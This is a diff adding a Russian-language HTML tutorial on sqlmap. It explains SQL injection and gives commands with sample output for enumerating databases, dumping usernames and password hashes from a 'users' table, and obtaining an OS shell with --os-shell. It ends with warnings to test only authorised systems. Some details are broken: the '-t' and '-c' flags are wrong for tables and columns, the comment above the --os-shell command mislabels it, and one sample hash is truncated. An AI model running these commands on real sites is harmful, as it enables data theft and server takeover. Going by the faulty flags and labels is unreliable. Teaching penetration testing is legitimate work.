@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Подробное руководство по sqlmap</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Source+Code+Pro&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/@tailwindcss/browser@latest"></script>
+    <link rel="stylesheet" href="sqlmap.css">
+</head>
+<body class="bg-gray-100">
+    <div class="container">
+        <h1 class="section-title">Подробное руководство по sqlmap</h1>
+
+        <section class="section-content">
+            <p>
+                sqlmap - это мощный инструмент с открытым исходным кодом, который автоматизирует процесс обнаружения и эксплуатации уязвимостей SQL-инъекций в веб-приложениях.
+            </p>
+        </section>
+
+        <section class="section-content">
+            <h2 class="section-title">Что такое SQL-инъекция?</h2>
+            <p>
+                SQL-инъекция - это уязвимость веб-приложения, которая позволяет злоумышленнику вмешиваться в запросы, которые приложение делает к базе данных.  Используя SQL-инъекцию, злоумышленник может получить несанкционированный доступ к конфиденциальным данным, изменять данные или даже выполнять команды операционной системы на сервере базы данных.
+            </p>
+        </section>
+
+        <section class="section-content">
+            <h2 class="section-title">Как работает sqlmap?</h2>
+            <p>
+                sqlmap автоматизирует процесс поиска и эксплуатации SQL-инъекций, выполняя следующие шаги:
+            </p>
+            <ul>
+                <li><strong>Обнаружение:</strong> sqlmap определяет, является ли параметр веб-приложения уязвимым для SQL-инъекции.</li>
+                <li><strong>Определение:</strong> Если параметр уязвим, sqlmap определяет тип используемой базы данных (например, MySQL, PostgreSQL, Oracle).</li>
+                <li><strong>Эксплуатация:</strong> sqlmap использует методы, специфичные для базы данных, для извлечения данных, изменения данных или выполнения произвольных команд.</li>
+            </ul>
+        </section>
+
+        <section class="section-content">
+            <h2 class="section-title">Основные возможности sqlmap</h2>
+            <p>
+                sqlmap поддерживает широкий спектр возможностей, включая:
+            </p>
+            <ul>
+                <li>Поддержку различных типов SQL-инъекций: основанные на логических ошибках, на ошибках, основанные на времени, основанные на объединениях запросов, out-of-band.</li>
+                <li>Поддержку многих типов баз данных: MySQL, PostgreSQL, Oracle, SQL Server, SQLite, и другие.</li>
+                <li>Различные методы эксплуатации: извлечение данных, запись данных, выполнение команд операционной системы.</li>
+                <li>Автоматическое обнаружение типа кодировки данных и обход WAF (Web Application Firewall).</li>
+                <li>Поддержку различных протоколов: HTTP, HTTPS, TCP.</li>
+            </ul>
+        </section>
+
+        <section class="section-content">
+            <h2 class="section-title">Примеры использования sqlmap</h2>
+
+            <h3 class="example-title">Базовое извлечение данных</h3>
+            <p>
+                Этот пример демонстрирует, как извлечь имена таблиц из базы данных.
+            </p>
+            <div class="example-code">
+                <pre><code>
+# Определение уязвимого параметра (например, 'id') и получение списка таблиц:
+sqlmap -u "http://example.com/page.php?id=1" --dbs --batch
+
+# Что вы увидите в терминале:
+# sqlmap проверит параметр 'id' на уязвимость, определит тип базы данных и извлечет список баз данных.
+# Затем он подключится к каждой базе данных и извлечет список таблиц.
+# Пример вывода:
+# Database: acdb
+# [5 tables]
+# +----------+
+# | users    |
+# | products |
+# | orders   |
+# | ...      |
+# +----------+
+                </code></pre>
+            </div>
+
+            <h3 class="example-title">Извлечение данных из таблицы</h3>
+            <p>
+                Этот пример показывает, как извлечь данные из определенной таблицы.
+            </p>
+            <div class="example-code">
+                <pre><code>
+# Получение списка столбцов в таблице 'users':
+sqlmap -u "http://example.com/page.php?id=1" -t users --columns --batch
+
+# Получение данных из столбцов 'id', 'username' и 'password' таблицы 'users':
+sqlmap -u "http://example.com/page.php?id=1" -t users -c id,username,password --dump --batch
+
+# Что вы увидите в терминале:
+# Сначала sqlmap получит список столбцов в таблице 'users'.
+# Затем он извлечет данные из указанных столбцов и отобразит их.
+# Пример вывода:
+# [10 entries]
+# +----+----------+------------------------------------------+
+# | id | username | password                                 |
+# +----+----------+------------------------------------------+
+# | 1  | admin    | 5ebe2294ecd0e0f08eab7690d2a6ee69       |
+# | 2  | user1    | b1f7e90c691f8b7291d6334b57b9195       |
+# | 3  | user2    | c52329562855980c6238b7f14e79b19e       |
+# | ...| ...      | ...                                      |
+# +----+----------+------------------------------------------+
+                </code></pre>
+            </div>
+
+            <h3 class="example-title">Выполнение команд операционной системы</h3>
+            <p>
+                Если уровень привилегий базы данных достаточно высок, sqlmap может выполнить команды операционной системы.
+            </p>
+            <div class="example-code">
+                <pre><code>
+# Получение текущего пользователя базы данных:
+sqlmap -u "http://example.com/page.php?id=1" --os-shell --batch
+
+# Что вы увидите в терминале:
+# sqlmap попытается определить текущего пользователя базы данных.
+# Если это удастся, он предоставит вам оболочку операционной системы.
+# Пример вывода:
+# os-shell> whoami
+# www-data
+# os-shell> pwd
+# /var/www/html
+# os-shell> 
+                </code></pre>
+            </div>
+        </section>
+
+        <section class="section-content">
+            <h2 class="section-title">Важные замечания</h2>
+            <ul class="list-disc list-inside">
+                <li><strong>Используйте sqlmap только на тех системах, которые вам разрешено тестировать.</strong> Несанкционированное использование sqlmap может привести к юридическим последствиям.</li>
+                <li><strong>Будьте осторожны при выполнении команд операционной системы.</strong>  Неправильные команды могут повредить систему.</li>
+                <li><strong>Всегда проверяйте входные данные и используйте параметризованные запросы</strong> для предотвращения SQL-инъекций в ваших веб-приложениях.</li>
+            </ul>
+        </section>
+    </div>
+</body>
+</html>
